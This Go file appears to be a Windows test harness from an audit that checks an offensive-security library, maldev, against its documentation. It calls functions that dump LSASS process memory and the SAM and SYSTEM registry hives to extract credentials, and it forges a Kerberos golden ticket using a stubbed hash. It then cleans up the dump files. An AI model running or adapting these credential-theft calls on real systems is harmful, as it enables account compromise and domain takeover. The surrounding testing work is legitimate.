//go:build windows

// credentials-suite — panorama 9 of the doc-truth audit.
//
// Built strictly from the user-facing markdown:
//   - docs/techniques/credentials/lsassdump.md   — DumpToFile + sentinel errors
//   - docs/techniques/credentials/samdump.md     — LiveDump
//   - docs/techniques/credentials/goldenticket.md — Forge (offline, no DC)
//
// Tests credential extraction. All paths require admin in practice;
// the matrix should show admin success / lowuser denial via the
// documented sentinel errors (ErrOpenDenied, etc.).
package main

import (
	"errors"
	"fmt"
	"os"

	"github.com/oioio-space/maldev/credentials/goldenticket"
	"github.com/oioio-space/maldev/credentials/lsassdump"
	"github.com/oioio-space/maldev/credentials/samdump"
)

func main() {
	// 1. lsassdump.DumpToFile — admin + SeDebugPrivilege required.
	//    The doc's "Usage" example branches on sentinel errors.
	fmt.Println("=== LSASS dump ===")
	dumpPath := `C:\Users\Public\maldev\lsass.snapshot`
	stats, err := lsassdump.DumpToFile(dumpPath, nil)
	switch {
	case err == nil:
		fmt.Printf("DumpToFile OK: %d regions / %d bytes / %d modules\n",
			stats.Regions, stats.Bytes, stats.ModuleCount)
		os.Remove(dumpPath)
	case errors.Is(err, lsassdump.ErrOpenDenied):
		fmt.Printf("DumpToFile: ErrOpenDenied (need admin/SeDebug)\n")
	case errors.Is(err, lsassdump.ErrPPL):
		fmt.Printf("DumpToFile: ErrPPL (RunAsPPL=1, separate chantier)\n")
	default:
		fmt.Printf("DumpToFile: %v\n", err)
	}

	// 2. samdump.LiveDump — copies SAM + SYSTEM hives, requires admin.
	fmt.Println("\n=== SAM dump (LiveDump) ===")
	dir := `C:\Users\Public\maldev`
	res, sysPath, samPath, err := samdump.LiveDump(dir)
	if err != nil {
		fmt.Printf("LiveDump: %v\n", err)
	} else {
		fmt.Printf("LiveDump OK: %d accounts dumped\n", len(res.Accounts))
		_ = os.Remove(sysPath)
		_ = os.Remove(samPath)
	}

	// 3. goldenticket.Forge — pure-offline crypto, no DC contact, no
	//    admin needed (you'd need a krbtgt hash from somewhere upstream
	//    — we stub it here to exercise the API surface).
	fmt.Println("\n=== Golden Ticket forge ===")
	params := goldenticket.Params{
		Domain:    "corp.example.com",
		DomainSID: "S-1-5-21-1111-2222-3333",
		// DOC-DRIFT (goldenticket.md): doc shows Hash{EType: ETypeAES256CTSHMACSHA196}
		// but code is Hash{Type: ETypeAES256CTS}. Two typo-class drifts in one
		// example.
		Hash: goldenticket.Hash{
			Type:  goldenticket.ETypeAES256CTS,
			Bytes: make([]byte, 32),
		},
	}
	if kirbi, err := goldenticket.Forge(params); err != nil {
		fmt.Printf("Forge: %v\n", err)
	} else {
		fmt.Printf("Forge OK: %d-byte kirbi\n", len(kirbi))
	}
}
